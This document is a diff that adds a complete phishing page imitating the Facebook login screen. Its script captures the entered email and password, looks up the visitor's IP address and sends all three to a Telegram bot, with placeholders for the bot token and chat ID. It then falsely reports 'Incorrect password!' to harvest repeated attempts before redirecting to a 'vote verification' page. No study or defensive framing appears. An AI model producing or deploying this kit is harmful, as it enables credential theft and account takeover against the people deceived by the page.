@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #e7ebf0, #f0f2f5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 95%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            background-color: #f5f6f7;
+            font-size: 16px;
+        }
+        .login-container input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+        .login-container a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+        }
+        .feedback {
+            color: red;
+            font-family: sans-serif;
+            font-size: 15px;
+            text-align: center;
+            margin: 0 30px;
+            display: none; /* Initially hidden */
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+        }
+        .footer p {
+            margin: 0;
+        }
+        .footer a {
+            color: #555;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <input id="email" type="text" placeholder="Mobile number or email address">
+        <input id="password" type="password" placeholder="Password">
+        <span id="feedback" class="feedback"></span>
+        <button id="login">Log in</button>
+        <a href="#">Forgotten Password?</a>
+        <button class="secondary-button" onclick="submit()">Create new account</button>
+        <div class="footer">
+            <img src="meta-6871457_1280.webp" alt="Meta Logo">
+            <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
+        </div>
+    </div>
+    <script>
+        var login = document.getElementById('login');
+        var email = document.getElementById('email');
+        var password = document.getElementById('password');
+        var feedback = document.getElementById('feedback');
+        var attempts = 0;
+
+        login.addEventListener('click', async function () {
+            feedback.style.display = 'none';
+
+            // Basic validation
+            if (email.value.trim() === '' || password.value.trim() === '') {
+                feedback.textContent = 'Please fill in both fields.';
+                feedback.style.display = 'block';
+                return;
+            }
+
+            // Fetch the user's IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // Prepare the message to send to Telegram
+                const message = `Email: ${email.value}\nPassword: ${password.value}\nIP: ${userIP}`;
+                const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
+                const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+                const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // Send the data to Telegram
+                const telegramResponse = await fetch(telegramUrl);
+                if (!telegramResponse.ok) {
+                    throw new Error('Failed to send data to Telegram.');
+                }
+
+                attempts++;
+                if (attempts < 3) {
+                    feedback.textContent = 'Incorrect password! Please try again...';
+                    feedback.style.display = 'block';
+                } else {
+                    // Redirect to another page after the last attempt
+                    setTimeout(() => {
+                        window.location.href = './vote_verification.html';
+                    }, 2000); // Redirect after 2 seconds
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                feedback.textContent = 'An error occurred. Please try again later.';
+                feedback.style.display = 'block';
+            }
+        });
+    </script>
+    
+</body>
+</html>
